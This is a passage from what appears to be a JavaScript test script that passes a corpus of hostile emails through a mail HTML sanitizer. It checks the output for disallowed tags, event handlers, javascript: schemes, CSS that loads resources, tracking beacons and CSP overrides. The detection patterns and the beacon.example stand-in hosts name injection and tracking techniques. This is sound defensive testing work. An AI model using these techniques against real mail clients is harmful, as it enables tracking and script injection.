  for (const c of copiesCensus(M.files, M.dir, REPO, { minCopies: 3 })) ok(c.pass, c.name, c.detail);
}

// ── ⑭ (security verify r2, continued) THE SHARED ATTACK CORPUS, IN NODE (the fast tier's half of ⑩x) ─────────────
// scripts/mail-attack-corpus.mjs is the chrome leg's corpus (test-channels-aggregate-ui ⑩x, heavy); the same mails
// run here through step 1 (the re-serializer) so a regression is red on every push, not only in the heavy tier. Our
// output is written from tokens — `<name k="v">`, text escaped, no `<` inside a style — so a token census over it is
// sound: every tag on ALLOWED_TAGS, every attribute on ALLOWED_ATTR (+ our two marks), no handler, no scheme but
// http(s) / mailto / a data: raster, no reach in CSS, no beacon in a picture before Show pictures, https only after.
console.log('⑭ the shared attack corpus through the re-serializer (a token census over every mail, pictures off and on)');
{
  const { mailAttackCorpus } = await import('./mail-attack-corpus.mjs');
  const B = 'http://beacon.example:9', S = 'https://beacon.example:10';
  const corpus = mailAttackCorpus(B, S);
  const ATTRS = new Set([...MF.ALLOWED_ATTR, 'data-vs-blocked', 'data-vs-quote']);
  const TAGS = new Set(MF.ALLOWED_TAGS);
  /** A CSS function a browser LOADS from (a data: raster url() is the one allowed) — a defanged spelling left as words
   *  (`\\75 rl(` → `75 rl(`, `url\\28` → `url28`) names no function and reaches nothing (the chrome leg counts the beacon). */
  const REACH_FN = /(?:^|[^a-z0-9_-])(?:url(?!\s*\(\s*"data:image\/)|image|image-set|-webkit-image-set|cross-fade|element|src)\s*\(/i;
  /** THE CENSUS of one html fragment → the reasons it is unsafe ([] = clean). */
  const censusOf = (h, pictures) => {
    const why = [];
    // strip the text of every <style> (a sanitized sheet, judged separately) before the token walk
    const styles = []; const noStyle = h.replace(/<style>([\s\S]*?)<\/style>/gi, (m, css) => { styles.push(css); return '<style></style>'; });
    const tagRe = /<(\/?)([^\s>/]+)((?:\s+[^\s=>]+="[^"]*")*)\s*>/g;
    let m, last = 0, stray = '';
    while ((m = tagRe.exec(noStyle))) {
      stray += noStyle.slice(last, m.index); last = tagRe.lastIndex;
      const name = m[2];
      if (!TAGS.has(name)) why.push(`tag <${name}>`);
      for (const [, k, v] of m[3].matchAll(/\s+([^\s=>]+)="([^"]*)"/g)) {
        if (!ATTRS.has(k)) why.push(`attr ${name}@${k}`);
        const dv = v.replace(/&quot;/g, '"').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&');
        if (k === 'href' && !/^(https?:\/\/|mailto:)/i.test(dv)) why.push(`href ${dv.slice(0, 40)}`);
        if (k === 'src' && !(/^data:image\/(png|jpeg|gif|webp|bmp);base64,/i.test(dv) || (pictures && /^https:\/\//i.test(dv)))) why.push(`src ${dv.slice(0, 40)}`);
        if (k === 'style' && (REACH_FN.test(dv) || /@import|expression|javascript:|behavior|binding|\\|[<>]/i.test(dv))) why.push(`style ${dv.slice(0, 60)}`);
        // every other allowed attribute is WORDS (alt, title, class, …): a beacon URL quoted inside one is inert text —
        // the attr-breakout mail's `"><script>…` stays an escaped value, which the token walk above already proves
      }
    }
    stray += noStyle.slice(last);
    if (/[<>]/.test(stray)) why.push(`a raw < or > in text: ${stray.match(/.{0,20}[<>].{0,20}/)[0]}`);
    for (const css of styles) if (REACH_FN.test(css) || /@import|expression|keyframes|animation|transition|javascript:|[<>\\]/i.test(css)) why.push(`<style> ${css.slice(0, 60)}`);
    if (!pictures && /src="https?:/.test(h)) why.push('a remote src before Show pictures');
    if (pictures && /src="http:/.test(h)) why.push('an http src after Show pictures');
    return [...new Set(why)];
  };
  const bad = [];
  for (const c of corpus) {
    for (const pictures of [false, true]) {
      const r = MF.sanitizeMailHtml(c.html, { pictures, cid: { 'logo@fake': 'data:image/png;base64,iVBORw0KGgo=' } });
      if (!r.ok) { bad.push(`${c.name}: not ok (${r.code})`); continue; }
      const why = censusOf(r.html, pictures);
      if (why.length) bad.push(`${c.name}${pictures ? ' (pictures)' : ''}: ${why.join('; ')}`);
    }
  }
  ok(corpus.length >= 55 && !bad.length, `every one of the ${corpus.length} corpus mails, pictures off AND on: only allowed tags / attributes, no handler, no scheme but http(s) / mailto / a data: raster, no reach in any style, no raw < in text, no remote picture before the press and no http one after`, bad.join('\n    '));
  const doc = MF.composeSrcdoc({ body: MF.sanitizeMailHtml(corpus.find((c) => c.name === 'csp-meta-attacker').html).html, nonce: 'n0nce', token: 't0ken' });
  ok(/^<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Content-Security-Policy" content="default-src &#39;none&#39;|^<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Content-Security-Policy" content="default-src 'none'/.test(doc) && (doc.match(/<meta /g) || []).length === 3 && (doc.match(/<script/g) || []).length === 1, 'the CSP <meta> is the SECOND element of the head (right after the charset), the mail\'s own CSP meta is gone, ONE script', doc.slice(0, 200));
  // CONTROL: the census is not blind — the SAME census over the RAW corpus (the step skipped) flags nearly every mail
  const rawFlagged = corpus.filter((c) => censusOf(c.html, false).length).map((c) => c.name);
  const rawClean = corpus.filter((c) => !censusOf(c.html, false).length).map((c) => c.name);
  ok(rawFlagged.length >= corpus.length - 4, `CONTROL: the same census over the RAW corpus flags ${rawFlagged.length} of ${corpus.length} mails (clean as written: ${rawClean.join(', ') || 'none'})`, rawClean.join(', '));
}

console.log(fail ? `\nFAILED (${pass} passed, ${fail} failed)` : `\nALL PASS (${pass})`);
process.exit(fail ? 1 : 0);
